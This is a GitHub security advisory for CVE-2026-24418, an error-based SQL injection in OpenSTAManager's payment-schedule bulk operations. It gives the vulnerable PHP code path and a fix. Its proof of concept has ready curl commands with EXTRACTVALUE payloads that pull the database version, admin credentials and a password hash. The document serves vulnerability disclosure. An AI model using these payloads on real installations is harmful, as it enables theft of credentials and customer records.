# [H] OpenSTAManager has a SQL Injection vulnerability in the Scadenzario bulk operations module

## Summary
Severity: High
Advisory: GHSA-4xwv-49c8-fvhq
CVE: CVE-2026-24418
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-06
Source: https://github.com/advisories/GHSA-4xwv-49c8-fvhq
Type: github-advisory

## Affected
- Packagist: `devcode-it/openstamanager` — affected >=0

## Details
### Summary

Critical Error-Based SQL Injection vulnerability in the Scadenzario (Payment Schedule) bulk operations module of OpenSTAManager v2.9.8 allows authenticated attackers to extract complete database contents including user credentials, customer PII, and financial records through XML error messages.

**Status:** ✅ Confirmed and tested on live instance (v2.9.8)
**Vulnerable Parameter:** `id_records[]` (POST array)
**Affected Endpoint:** `/actions.php?id_module=18` (Scadenzario module)
**Attack Type:** Error-Based SQL Injection (IN clause)

### Details

OpenSTAManager v2.9.8 contains a critical Error-Based SQL Injection vulnerability in the bulk operations handler for the Scadenzario (Payment Schedule) module. The application fails to validate that elements of the `id_records` array are integers before using them in an SQL IN() clause, allowing attackers to inject arbitrary SQL commands and extract sensitive data through XPATH error messages.

**Vulnerability Chain:**

1. **Entry Point:** `/actions.php` (Lines 503-506)
   ```php
   $id_records = post('id_records');
   $id_records = is_array($id_records) ? $id_records : explode(';', $id_records);
   $id_records = array_clean($id_records);
   $id_records = array_unique($id_records);
   ```
   The `array_clean()` function only removes empty values - it does NOT validate types.

2. **Vulnerable Function:** `/lib/util.php` (Lines 54-60)
   ```php
   function array_clean($array)
   {
       if (!empty($array)) {
           return array_unique(array_values(array_filter($array, fn ($value) => !empty($value))));
       }
   }
   ```
   **Impact:** The function filters out empty values but accepts any non-empty value, including SQL Injection payloads.

3. **SQL Injection Point:** `/modules/scadenzario/bulk.php` (Line 88) **PRIMARY VULNERABILITY**
   ```php
   $scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');
   ```
   **Impact:** Array elements from `$id_records` are directly concatenated using `implode()` without type validation or `prepare()`, enabling full SQL Injection.

**Root Cause Analysis:**

The vulnerability exists because:
1. `post('id_records')` returns user-controlled array
2. `array_clean()` only removes empty values, not non-integer values
3. `implode(',', $id_records)` concatenates array elements directly into SQL
4. No validation ensures array elements are integers
5. Attacker can inject SQL by providing: `id_records[]=1&id_records[]=(MALICIOUS SQL)#`

**Affected Code Path:**
```
POST /actions.php?id_module=18
  ↓
actions.php:503 - $id_records = post('id_records')
  ↓
actions.php:505 - $id_records = array_clean($id_records) [NO TYPE VALIDATION]
  ↓
actions.php:509 - include 'modules/scadenzario/bulk.php'
  ↓
bulk.php:88 - WHERE id IN ('.implode(',', $id_records).') [INJECTION POINT]
```

### PoC

**Step 1: Login**
```bash
curl -c cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \
  -d 'username=admin&password=admin'
```

**Step 2: Verify Vulnerability (Error-Based SQL Injection)**

**Test 1: Extract Database User and Version**
```bash
curl -b cookies.txt \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
  "http://localhost:8081/actions.php?id_module=18"
```

**Response (error message visible to attacker):**
```html
<code>XPATH syntax error: '~osm@localhost | 8.0.40-0ubuntu0.22.04.1'</code>
```

**Test 2: Extract Admin Credentials**
```bash
curl -b cookies.txt \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1)))%23" \
  "http://localhost:8081/actions.php?id_module=18"
```

**Response:**
```html
<code>XPATH syntax error: '~admin:admin@osm.local'</code>
```

**Test 3: Extract Password Hash (Part 1 - first 31 chars)**
```bash
curl -b cookies.txt \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users LIMIT 1)))%23" \
  "http://localhost:8081/actions.php?id_module=18"
```

**Response:**
```html
<code>XPATH syntax error: '~$2y$10$UUPECY1DhQXm2pGEq/UNAeMd'</code>
```

**Test 4: Extract Password Hash (Part 2 - chars 32-60)**
```bash
curl -b cookies.txt \
  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,60) FROM zz_users LIMIT 1)))%23" \
  "http://localhost:8081/actions.php?id_module=18"
```

**Response:**
```html
<code>XPATH syntax error: '~SoqiRNefN.G9fYMVnCRcvmG0BnwTK'</code>
```

**Combined Password Hash:**
```
$2y$10$UUPECY1DhQXm2pGEq/UNAeMdSoqiRNefN.G9fYMVnCRcvmG0BnwTK
```


### Impact

**All authenticated users with access to the Scadenzario (Payment Schedule) module bulk operations.

**Recommended Fix:**

**Primary Fix - Type Validation:**

File: `/modules/scadenzario/bulk.php`

**BEFORE (Vulnerable - Line 88):**
```php
$scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');
```

**AFTER (Fixed):**
```php
// Validate that all array elements are integers
$id_records = array_map('intval', $id_records);
$id_records = array_filter($id_records, fn($id) => $id > 0); // Remove zero/negative IDs

$scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');
```

### Credits
Discovered by Łukasz Rybak

## References
- https://github.com/devcode-it/openstamanager/security/advisories/GHSA-4xwv-49c8-fvhq
- https://nvd.nist.gov/vuln/detail/CVE-2026-24418
- https://github.com/devcode-it/openstamanager
